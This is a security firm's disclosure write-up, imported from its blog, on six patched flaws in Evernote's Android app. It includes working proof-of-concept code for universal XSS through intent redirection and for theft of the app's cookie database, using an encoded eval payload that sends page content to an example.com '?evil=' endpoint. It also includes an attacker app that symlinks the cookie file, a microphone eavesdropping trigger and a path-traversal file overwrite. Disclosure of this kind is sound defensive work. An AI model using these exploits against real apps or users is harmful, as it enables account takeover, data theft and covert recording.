---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-11-12_evernote-universal-xss-theft-of-all-cookies-from-all-sites-and-more.md
original_filename: 2020-11-12_evernote-universal-xss-theft-of-all-cookies-from-all-sites-and-more.md
title: 'Evernote: Universal-XSS, theft of all cookies from all sites, and more'
category: notes
detected_topics:
- mobile-security
- xss
- sqli
- command-injection
- path-traversal
- cloud-security
tags:
- imported
- notes
- mobile-security
- xss
- sqli
- command-injection
- path-traversal
- cloud-security
language: en
raw_sha256: 121ef86150e672eefd65b0619327758fe1d485ca80b58a2566a1e74aeda93fbd
text_sha256: be348f7f656afe35f67f4969181b832da73e8ee65614b9d1077ebe2e5c55c6b9
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# Evernote: Universal-XSS, theft of all cookies from all sites, and more

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-11-12_evernote-universal-xss-theft-of-all-cookies-from-all-sites-and-more.md
- Source Type: markdown
- Detected Topics: mobile-security, xss, sqli, command-injection, path-traversal, cloud-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `121ef86150e672eefd65b0619327758fe1d485ca80b58a2566a1e74aeda93fbd`
- Text SHA256: `be348f7f656afe35f67f4969181b832da73e8ee65614b9d1077ebe2e5c55c6b9`


## Content

---
title: "Evernote: Universal-XSS, theft of all cookies from all sites, and more"
page_title: "Evernote: Universal-XSS, theft of all cookies from all sites, and more | Oversecured Blog"
url: "https://blog.oversecured.com/Evernote-Universal-XSS-theft-of-all-cookies-from-all-sites-and-more/"
final_url: "https://oversecured.com/blog/evernote-universal-xss-theft-of-all-cookies-from-all-sites-and-more"
authors: ["Oversecured (@OversecuredInc)"]
programs: ["Evernote"]
bugs: ["Universal XSS"]
publication_date: "2020-11-12"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4143
---

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

Dast is live! 

[Learn more →](../dast)

Dast is live! 

Run a new scan to see dynamic findings in your reports

[Learn more →](../dast)

[](../)

[BLOG](../blog)

[Case studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

solutions

[Sign in](https://app.oversecured.com/sign-in)

Contact us

[](../)

[](../)

No headings found on page

Nov 12, 2020

Case Study

###### Evernote: Universal-XSS, theft of all cookies from all sites, and more

###### Evernote: Universal-XSS, theft of all cookies from all sites, and more

![](https://framerusercontent.com/images/6kTbxsz8gm3Gk9ERfjwV3g4MxMk.png?width=2048&height=1194)

Oversecured found dangerous vulnerabilities in the Evernote app for Android, which could have allowed access to user accounts to be intercepted by a hostile app installed on the same device. Some time ago, we decided to scan the app — and we discovered six vulnerabilities. They included the potential for Universal-XSS (execution of arbitrary JavaScript code on an arbitrary domain), theft of cookies from all sites, rewriting of arbitrary files, and automatic activation of the microphone to eavesdrop on the user. Evernote fixed these issues as of release 8.12.2, released October 2019. Evernote’s security team reports that they do not have any evidence that these issues were exploited in the wild.

Do you want to check your mobile apps for such types of vulnerabilities? Oversecured mobile apps scanner provides an automatic solution that helps to detect vulnerabilities in Android and iOS mobile apps. You can integrate Oversecured into your development process and check every new line of your code to ensure your users are always protected.

Start securing your apps by starting a free 2 weeks trial from [Quick Start](https://app.oversecured.com/docs/quick-start/), or you can [book a call](https://calendly.com/oversecured/30min) with our team or [contact us](https://app.oversecured.com/contact-us) to explore more.

## Universal-XSS

We uncovered access to arbitrary components in activities `com.evernote.widget.Widget4x1SettingsActivity`:

![](https://framerusercontent.com/images/3IdBy5kLTNY3wx4yxfWsYQjXNs.png?width=2194&height=1920)

and `com.evernote.widget.Widget4x2SettingsActivity`:

![](https://framerusercontent.com/images/HuRw6LlXtXiC9awvdbwz8oUe0.png?width=2190&height=1718)

An attacker could have used this error to gain access to arbitrary activities. We decided to use the unexported activity `com.evernote.engine.gnome.GnomeWebViewActivity`, which took two parameters — `EXTRA_BASE_URL` and `EXTRA_HTML_CONTENT` — and passed them when calling `WebView.loadDataWithBaseURL(String baseUrl, String data, String mimeType, String encoding, String historyUrl)`, which allowed arbitrary HTML/JS to be displayed for an arbitrary URL. The app also added an authentication cookie to `EXTRA_BASE_URL`, meaning account access could be intercepted.
  
  
  public void onCreate(Bundle bundle) {
  super.onCreate(bundle);
  m18857J();
  this.f15723i = getIntent().getIntExtra("EXTRA_SCREEN_TYPE", 0);
  
  
  public void onCreate(Bundle bundle) {
  super.onCreate(bundle);
  m18857J();
  this.f15723i = getIntent().getIntExtra("EXTRA_SCREEN_TYPE", 0);
  
  
  public void onCreate(Bundle bundle) {
  super.onCreate(bundle);
  m18857J();
  this.f15723i = getIntent().getIntExtra("EXTRA_SCREEN_TYPE", 0);
  
  
  switch (this.f15723i) {
  //...
  default:
  Intent intent = getIntent();
  mo16603a(intent.getStringExtra("EXTRA_BASE_URL"), intent.getStringExtra("EXTRA_HTML_CONTENT"), getAccount());
  //...
  }
  
  
  switch (this.f15723i) {
  //...
  default:
  Intent intent = getIntent();
  mo16603a(intent.getStringExtra("EXTRA_BASE_URL"), intent.getStringExtra("EXTRA_HTML_CONTENT"), getAccount());
  //...
  }
  
  
  switch (this.f15723i) {
  //...
  default:
  Intent intent = getIntent();
  mo16603a(intent.getStringExtra("EXTRA_BASE_URL"), intent.getStringExtra("EXTRA_HTML_CONTENT"), getAccount());
  //...
  }
  
  
  public void mo16603a(String str, String str2, AbstractC2928x xVar) {
  //...
  Global.cookieUtil().mo41610a("GnomeWebViewActivity", str, xVar).mo51586e(new C3076r(this, str, str2)); // runs RunnableC3077s
  }
  
  
  public void mo16603a(String str, String str2, AbstractC2928x xVar) {
  //...
  Global.cookieUtil().mo41610a("GnomeWebViewActivity", str, xVar).mo51586e(new C3076r(this, str, str2)); // runs RunnableC3077s
  }
  
  
  public void mo16603a(String str, String str2, AbstractC2928x xVar) {
  //...
  Global.cookieUtil().mo41610a("GnomeWebViewActivity", str, xVar).mo51586e(new C3076r(this, str, str2)); // runs RunnableC3077s
  }

File `com.evernote.engine.gnome.RunnableC3077s`:
  
  
  public void run() {
  GnomeWebViewActivity gnomeWebViewActivity = this.f15786c;
  WebView webView = gnomeWebViewActivity.f15715a;
  if (webView == null || gnomeWebViewActivity.f15716b == null) {
  GnomeWebViewActivity.LOGGER.mo14433e("contentLoadedAndCookieSet - mWebView or mLoadingView are null; aborting");
  return;
  }
  webView.loadDataWithBaseURL(this.f15784a, this.f15785b, "text/html", "UTF-8", null); // universal-xss!
  this.f15786c.f15716b.setVisibility(8);
  }
  
  
  public void run() {
  GnomeWebViewActivity gnomeWebViewActivity = this.f15786c;
  WebView webView = gnomeWebViewActivity.f15715a;
  if (webView == null || gnomeWebViewActivity.f15716b == null) {
  GnomeWebViewActivity.LOGGER.mo14433e("contentLoadedAndCookieSet - mWebView or mLoadingView are null; aborting");
  return;
  }
  webView.loadDataWithBaseURL(this.f15784a, this.f15785b, "text/html", "UTF-8", null); // universal-xss!
  this.f15786c.f15716b.setVisibility(8);
  }
  
  
  public void run() {
  GnomeWebViewActivity gnomeWebViewActivity = this.f15786c;
  WebView webView = gnomeWebViewActivity.f15715a;
  if (webView == null || gnomeWebViewActivity.f15716b == null) {
  GnomeWebViewActivity.LOGGER.mo14433e("contentLoadedAndCookieSet - mWebView or mLoadingView are null; aborting");
  return;
  }
  webView.loadDataWithBaseURL(this.f15784a, this.f15785b, "text/html", "UTF-8", null); // universal-xss!
  this.f15786c.f15716b.setVisibility(8);
  }

### Proof of Concept
  
  
  Intent next = new Intent();
  next.setClassName("com.evernote", "com.evernote.engine.gnome.GnomeWebViewActivity");
  next.putExtra("EXTRA_BASE_URL", "http://example.com/");
  next.putExtra("EXTRA_HTML_CONTENT", "<script>alert(document.domain)</script><iframe src='http://example.com/' height='100%' width='100%'></iframe>");
  
  Intent intent = new Intent();
  intent.setClassName("com.evernote", "com.evernote.widget.Widget4x1SettingsActivity");
  intent.putExtra("POSTPONED_ACTION_INTENT", next);
  startActivity(intent);
  
  
  Intent next = new Intent();
  next.setClassName("com.evernote", "com.evernote.engine.gnome.GnomeWebViewActivity");
  next.putExtra("EXTRA_BASE_URL", "http://example.com/");
  next.putExtra("EXTRA_HTML_CONTENT", "<script>alert(document.domain)</script><iframe src='http://example.com/' height='100%' width='100%'></iframe>");
  
  Intent intent = new Intent();
  intent.setClassName("com.evernote", "com.evernote.widget.Widget4x1SettingsActivity");
  intent.putExtra("POSTPONED_ACTION_INTENT", next);
  startActivity(intent);
  
  
  Intent next = new Intent();
  next.setClassName("com.evernote", "com.evernote.engine.gnome.GnomeWebViewActivity");
  next.putExtra("EXTRA_BASE_URL", "http://example.com/");
  next.putExtra("EXTRA_HTML_CONTENT", "<script>alert(document.domain)</script><iframe src='http://example.com/' height='100%' width='100%'></iframe>");
  
  Intent intent = new Intent();
  intent.setClassName("com.evernote", "com.evernote.widget.Widget4x1SettingsActivity");
  intent.putExtra("POSTPONED_ACTION_INTENT", next);
  startActivity(intent);

`script` is written to `EXTRA_HTML_CONTENT` to show the domain where the code was executed (since the `EXTRA_BASE_URL` request will not be sent), and `iframe` so that the request is sent to `example.com` and the session can be seen in the cookies.

## Theft of all cookies from all sites

Access to arbitrary components was also detected in the activity `com.evernote.ui.ContractNoUiActivity`, which is exported and takes external data:

![](https://framerusercontent.com/images/stLkwDRnN3NHQWWzoARtcNos5c.png?width=2200&height=8616)

As the screenshot shows, the app tries to validate the received intent and installs the component to `null`:
  
  
  switch (c) {
  case 0: // triggered when the action is installed to "com.evernote.action.DELAYED_NOTE_ACTION"
  Intent intent2 = (Intent) intent.getParcelableExtra("DELAYED_INTENT"); // controlled by the attacker
  if (intent2 != null) {
  intent2.setComponent(null); // component is reset
  // ... later, it runs
  
  
  switch (c) {
  case 0: // triggered when the action is installed to "com.evernote.action.DELAYED_NOTE_ACTION"
  Intent intent2 = (Intent) intent.getParcelableExtra("DELAYED_INTENT"); // controlled by the attacker
  if (intent2 != null) {
  intent2.setComponent(null); // component is reset
  // ... later, it runs
  
  
  switch (c) {
  case 0: // triggered when the action is installed to "com.evernote.action.DELAYED_NOTE_ACTION"
  Intent intent2 = (Intent) intent.getParcelableExtra("DELAYED_INTENT"); // controlled by the attacker
  if (intent2 != null) {
  intent2.setComponent(null); // component is reset
  // ... later, it runs

trying to filter the intent received. But, as we wrote in [our article](https://blog.oversecured.com/Android-Access-to-app-protected-components/) on this vulnerability, the check can be bypassed using a selector — which also leads to access to arbitrary activities.

We also made use of the activity `com.qualtrics.digital.QualtricsSurveyActivity`, which took a `targetURL` value and passed it to `WebView.loadUrl()`. It was thus possible to open arbitrary links in the builtin WebView. We then employed a technique for stealing all cookies from all sites to steal the file `/data/data/com.evernote/app_webview/Default/Cookies`, which is an SQLite database storing cookies’ domain, key, and value, and also various flags including HttpOnly, Secure, etc., for the current app.

The exploit works like this:

  1. A cookie is installed containing JavaScript code that receives content from the current page and sends it to the attacker’s server

  2. A symlink with `.html` extension is created inside the internal directory of the attacker’s app, pointing to the `Cookies` file

  3. The attacker first opens their own site, which installs the cookie, and then opens the symlink (we added a 45-second delay, because the cookie is not synced and written to the file instantaneously), leading to the binary file being passed as HTML, the JS code being executed, and the entire content being leaked to the attacker

Code to obtain the content of an entire page:
  
  
  new Image().src =
  'http://example.com/?evil=' +
  encodeURIComponent(document.getElementsByTagName('html')[0].innerHTML);
  
  
  new Image().src =
  'http://example.com/?evil=' +
  encodeURIComponent(document.getElementsByTagName('html')[0].innerHTML);
  
  
  new Image().src =
  'http://example.com/?evil=' +
  encodeURIComponent(document.getElementsByTagName('html')[0].innerHTML);

Cookie installation:
  
  
  document.cookie =
  'x = \'<img src="x" onerror="eval(atob(\'bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly9leGFtcGxlLmNvbS8/ZXZpbD0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF0uaW5uZXJIVE1MKTs=\'))">\'';
  
  
  document.cookie =
  'x = \'<img src="x" onerror="eval(atob(\'bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly9leGFtcGxlLmNvbS8/ZXZpbD0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF0uaW5uZXJIVE1MKTs=\'))">\'';
  
  
  document.cookie =
  'x = \'<img src="x" onerror="eval(atob(\'bmV3IEltYWdlKCkuc3JjID0gImh0dHA6Ly9leGFtcGxlLmNvbS8/ZXZpbD0iICsgZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmdldEVsZW1lbnRzQnlUYWdOYW1lKCJodG1sIilbMF0uaW5uZXJIVE1MKTs=\'))">\'';

Code in the attacker’s Android app:
  
  
  private static final String APP = "com.evernote";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  launch("https://redacted.s3.amazonaws.com/set_cookies.html");
  new Handler().postDelayed(() -> launch("file://" + symlink()), 45000);
  }
  
  private void launch(String url) {
  Intent next = new Intent();
  next.setSelector(new Intent().setClassName(APP, "com.qualtrics.digital.QualtricsSurveyActivity"));
  next.putExtra("targetURL", url);
  next.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
  
  Intent i = new Intent();
  i.setClassName(APP, "com.evernote.ui.ContractNoUiActivity");
  i.putExtra("DELAYED_INTENT", next);
  i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
  startActivity(i);
  }
  
  private String symlink() {
  try {
  String root = getApplicationInfo().dataDir;
  String symlink = root + "/symlink.html";
  String cookies = getPackageManager().getApplicationInfo(APP, 0).dataDir + "/app_webview/Default/Cookies";
  
  Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();
  Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();
  
  return symlink;
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  
  private static final String APP = "com.evernote";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  launch("https://redacted.s3.amazonaws.com/set_cookies.html");
  new Handler().postDelayed(() -> launch("file://" + symlink()), 45000);
  }
  
  private void launch(String url) {
  Intent next = new Intent();
  next.setSelector(new Intent().setClassName(APP, "com.qualtrics.digital.QualtricsSurveyActivity"));
  next.putExtra("targetURL", url);
  next.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
  
  Intent i = new Intent();
  i.setClassName(APP, "com.evernote.ui.ContractNoUiActivity");
  i.putExtra("DELAYED_INTENT", next);
  i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
  startActivity(i);
  }
  
  private String symlink() {
  try {
  String root = getApplicationInfo().dataDir;
  String symlink = root + "/symlink.html";
  String cookies = getPackageManager().getApplicationInfo(APP, 0).dataDir + "/app_webview/Default/Cookies";
  
  Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();
  Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();
  
  return symlink;
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }
  
  
  private static final String APP = "com.evernote";
  
  protected void onCreate(Bundle savedInstanceState) {
  super.onCreate(savedInstanceState);
  
  launch("https://redacted.s3.amazonaws.com/set_cookies.html");
  new Handler().postDelayed(() -> launch("file://" + symlink()), 45000);
  }
  
  private void launch(String url) {
  Intent next = new Intent();
  next.setSelector(new Intent().setClassName(APP, "com.qualtrics.digital.QualtricsSurveyActivity"));
  next.putExtra("targetURL", url);
  next.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
  
  Intent i = new Intent();
  i.setClassName(APP, "com.evernote.ui.ContractNoUiActivity");
  i.putExtra("DELAYED_INTENT", next);
  i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
  startActivity(i);
  }
  
  private String symlink() {
  try {
  String root = getApplicationInfo().dataDir;
  String symlink = root + "/symlink.html";
  String cookies = getPackageManager().getApplicationInfo(APP, 0).dataDir + "/app_webview/Default/Cookies";
  
  Runtime.getRuntime().exec("ln -s " + cookies + " " + symlink).waitFor();
  Runtime.getRuntime().exec("chmod -R 777 " + root).waitFor();
  
  return symlink;
  } catch (Throwable th) {
  throw new RuntimeException(th);
  }
  }

### Result

![](https://framerusercontent.com/images/Z9yGhln4d7IhktlGdxWD1lfA.png?width=1044&height=509)

The vulnerability worked with WebView default settings when JavaScript was enabled (`WebView.getSettings().setJavaScriptEnabled(true)`). This peculiarity of WebView has been fixed quite recently, and binary files are no longer opened as HTML even if they have a `.html` extension.

We found several other ways to access arbitrary components via `com.evernote.ui.helper.URIBrokerActivity` and `com.evernote.ui.phone.NewPhoneMainActivity`, which also made it possible either to steal all cookies or else to achieve UXSS via the activities described above.

## Eavesdropping on the user

The Evernote app has the right to access the microphone, which it uses to record voice notes in activity `com.evernote.ui.ContractNoUiActivity`. The record function was automatically activated when this activity was run with the action `com.evernote.widget.action.NEW_VOICE_NOTE`, and the app would begin recording from the microphone to the file `/sdcard/Android/data/com.evernote/files/Temp/Shared/AudioNote-{date}.amr` (which is a world-readable directory). Thus, apps without microphone access writes could use Evernote to eavesdrop on the user.

![](https://framerusercontent.com/images/5HCEurUh65TcGqWM6q7gY5Jdl4.png?width=2194&height=5390)

### Proof of Concept
  
  
  startActivity(new Intent("com.evernote.widget.action.NEW_VOICE_NOTE"));
  
  
  startActivity(new Intent("com.evernote.widget.action.NEW_VOICE_NOTE"));
  
  
  startActivity(new Intent("com.evernote.widget.action.NEW_VOICE_NOTE"));

It is then necessary to read the file that has been created.

## Overwriting arbitrary files

The activity `com.evernote.clipper.ClipActivity`, intended for adding files to the user’s notes, was exported and could take arbitrary data from an attacker. In the case of an action installed in `android.intent.action.SEND`, the app took a Uri from the parameter `android.intent.extra.STREAM` and saved the content to `/sdcard/Android/data/com.evernote/files/Temp/Shared/`. The problem was with the file `com/evernote/note/composer/Attachment.java`, because in the case of a `content://` scheme the app received the value of `_display_name` from the provider and saved the file with this name, leading to path-traversal.

### Proof of Concept 

To create file `/data/data/com.evernote/evil`

File `AndroidManifest.xml`:
  
  
  <provider android:name=".EvilContentProvider" android:authorities="oversecured.evil" android:enabled="true" android:exported="true" />
  
  
  <provider android:name=".EvilContentProvider" android:authorities="oversecured.evil" android:enabled="true" android:exported="true" />
  
  
  <provider android:name=".EvilContentProvider" android:authorities="oversecured.evil" android:enabled="true" android:exported="true" />

File `EvilContentProvider.java`:
  
  
  public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
  MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
  matrixCursor.addRow(new Object[]{uri.getQueryParameter("name")});
  return matrixCursor;
  }
  
  public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
  return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_READ_ONLY);
  }
  
  
  public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
  MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
  matrixCursor.addRow(new Object[]{uri.getQueryParameter("name")});
  return matrixCursor;
  }
  
  public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
  return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_READ_ONLY);
  }
  
  
  public Cursor query(Uri uri, String[] projection, String selection, String[] selectionArgs, String sortOrder) {
  MatrixCursor matrixCursor = new MatrixCursor(new String[]{"_display_name"});
  matrixCursor.addRow(new Object[]{uri.getQueryParameter("name")});
  return matrixCursor;
  }
  
  public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
  return ParcelFileDescriptor.open(new File(uri.getQueryParameter("path")), ParcelFileDescriptor.MODE_READ_ONLY);
  }

File `MainActivity.java`:
  
  
  Intent intent = new Intent(Intent.ACTION_SEND);
  intent.setClassName("com.evernote", "com.evernote.clipper.ClipActivity");
  intent.putExtra(Intent.EXTRA_STREAM, Uri.parse("content://oversecured.evil/?path=/data/data/oversecured.poc/evil&name=../../../../../../../../../data/data/com.evernote/evil"));
  startActivity(intent);
  
  
  Intent intent = new Intent(Intent.ACTION_SEND);
  intent.setClassName("com.evernote", "com.evernote.clipper.ClipActivity");
  intent.putExtra(Intent.EXTRA_STREAM, Uri.parse("content://oversecured.evil/?path=/data/data/oversecured.poc/evil&name=../../../../../../../../../data/data/com.evernote/evil"));
  startActivity(intent);
  
  
  Intent intent = new Intent(Intent.ACTION_SEND);
  intent.setClassName("com.evernote", "com.evernote.clipper.ClipActivity");
  intent.putExtra(Intent.EXTRA_STREAM, Uri.parse("content://oversecured.evil/?path=/data/data/oversecured.poc/evil&name=../../../../../../../../../data/data/com.evernote/evil"));
  startActivity(intent);

In this way an arbitrary file could be written or rewritten.

##### Keep reading

[View all](../blog)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/3pdKQL7LiXMgBBDS1jzcalJrMnA.png?width=2048&height=1194)Android security checklist: theft of arbitrary filesDevelopers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. Android SecurityMay 20, 202211min readTOp article](./android-security-checklist-theft-of-arbitrary-files)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/Rc4vdbWk96raW6IX7NbRcRJoS5U.png?width=2046&height=1194)20 Security Issues Found in Xiaomi DevicesOversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilitiesCase StudyMay 2, 202415min readTOp article](./20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)Android deep link vulnerabilities: how intent filters lead to account takeoverA technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.Android SecurityApr 27, 20268min read](./android-deep-link-vulnerabilities)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./evernote-universal-xss-theft-of-all-cookies-from-all-sites-and-more#header)

[](../)

[go up ↑](./evernote-universal-xss-theft-of-all-cookies-from-all-sites-and-more#header)

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

2026 © Oversecured

[Blog](../blog)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

[Case Studies](https://oversecured.com/blog?category=case-study)

[](../)

[Blog](../blog)

[Case Studies](https://oversecured.com/blog?category=case-study)

[Partner](../partner)

[Wall of fame](../cve)

[Dynamic Analysis (DAST)](../dast)

[Static Analysis (SAST)](../sast)

[Interactive Analysis (IAST)](../iast)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](../privacy)

[Terms of use](../terms)

[go up ↑](./evernote-universal-xss-theft-of-all-cookies-from-all-sites-and-more#header)
